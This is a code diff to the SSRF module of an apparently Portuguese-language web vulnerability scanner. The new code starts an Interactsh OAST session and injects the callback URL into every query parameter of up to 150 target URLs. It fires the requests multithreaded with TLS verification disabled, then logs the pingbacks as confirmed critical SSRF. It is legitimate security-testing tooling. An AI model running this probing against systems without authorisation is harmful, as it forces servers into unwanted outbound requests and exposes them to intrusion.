@@ -85,35 +85,84 @@ def run(context: dict):
                     })
                     info(f"   🚨 {C.RED}SSRF Detectado:{C.END} {res}")
     else:
-        warn("   [!] 'ssrfmap' não encontrado. Rodando checks superficiais nativos...")
-        # Lógica superficial caso não exista o SSRFMap
+        warn("   [!] 'ssrfmap' não encontrado. Implementando testes OAST Dinâmicos nativos...")
         import httpx
-        from urllib.parse import urlparse
-        
-        # Testar webhook/oast básico
-        oast_url = ""
-        oast_file = Path("output") / target / "oast_payload.txt"
-        if oast_file.exists():
-            oast_url = oast_file.read_text(errors="ignore").strip()
+        from ..http_utils import throttle
+        import urllib.parse
+        import time
+        import re
+
+        interact_bin = shutil.which("interactsh-client")
+        if interact_bin:
+            info("   [i] Interactsh detectado! Subindo servidor OAST temporal...")
+            log_json = outdir / "oast_logs.json"
             
-        if oast_url:
-            def run_native_ssrf(url):
-                try:
-                    import qsreplace # type: ignore
-                except:
-                    pass
-                try:
-                    with httpx.Client(verify=False, timeout=5) as client:
-                        client.get(url)  # Se url já injetada
-                except:
-                    pass
+            proc = subprocess.Popen([interact_bin, "-json", "-o", str(log_json)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            
+            oast_url = None
+            for _ in range(40):
+                line = proc.stdout.readline()
+                if not line: break
+                
+                # Extrai ex: xxxx.oast.pro ou  xxxx.oast.me
+                # Log padrão: [INF] xxxx.oast.pro
+                match = re.search(r'([a-z0-9\-]+\.[a-z0-9\-]+\.[a-z]+)', line)
+                if match and ("oast" in match.group() or "interact" in match.group() or "pingb" in match.group()):
+                    oast_url = match.group()
+                    break
+
+            if oast_url:
+                if not oast_url.startswith("http"):
+                    oast_url = "http://" + oast_url
                     
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                for u in urls[:100]:
-                    executor.submit(run_native_ssrf, u)
-            info("   [i] Payloads disparados via OAST. Verifique seu painel Interactsh/Burp Collaborator.")
+                info(f"   [+] Sessão OAST criada com sucesso: {C.GREEN}{oast_url}{C.END}")
+                
+                # Envenenar parâmetros na memoria
+                injected_urls = set()
+                for u in urls[:150]: # Top 150 para prevenir bans
+                    parsed = urllib.parse.urlparse(u)
+                    if parsed.query:
+                        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+                        new_qs = "&".join([f"{k}={oast_url}" for k in qs])
+                        injected_urls.add(urllib.parse.urlunparse(parsed._replace(query=new_qs)))
+                
+                info(f"   [+] Disparando {len(injected_urls)} cargas venenosas multi-thread...")
+
+                def shoot(url):
+                    throttle()
+                    try: httpx.get(url, verify=False, timeout=5)
+                    except: pass
+                    
+                with ThreadPoolExecutor(max_workers=10) as executor:
+                    for u in injected_urls:
+                        executor.submit(shoot, u)
+                        
+                info("   [i] Aguardando 10 segundos por interações OAB/DNS Reversas...")
+                time.sleep(10)
+                
+                proc.terminate()
+                
+                if log_json.exists():
+                    try:
+                        for entry_line in log_json.read_text(errors="ignore").splitlines():
+                            if not entry_line.strip(): continue
+                            entry = json.loads(entry_line)
+                            
+                            deduped.append({
+                                "url": f"{entry.get('protocol', 'Unknown')} Interação Capturada",
+                                "type": "SSRF / OAST Pingback",
+                                "severity": "CRITICAL",
+                                "details": f"Conexão do IP alvo: {entry.get('remote-address')} na porta {entry.get('remote-port', 'N/A')}",
+                                "action": "Vulnerabilidade Confirmada! Realize SSRF Manual."
+                            })
+                            info(f"   🚨 {C.RED}Callback OAST Detectado de {entry.get('remote-address')}{C.END}")
+                    except Exception as err:
+                        error(f"   [-] Erro ao ler Logs do Interactsh: {err}")
+            else:
+                proc.terminate()
+                warn("   [-] Não foi possível extrair a URL de Payload do Interactsh.")
         else:
-            info("   [i] Nenhum OAST configurado para testar SSRF blind.")
+            warn("   [-] interactsh-client também não está instalado. Pulando SSRF OAST dinâmico.")
 
     results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
     
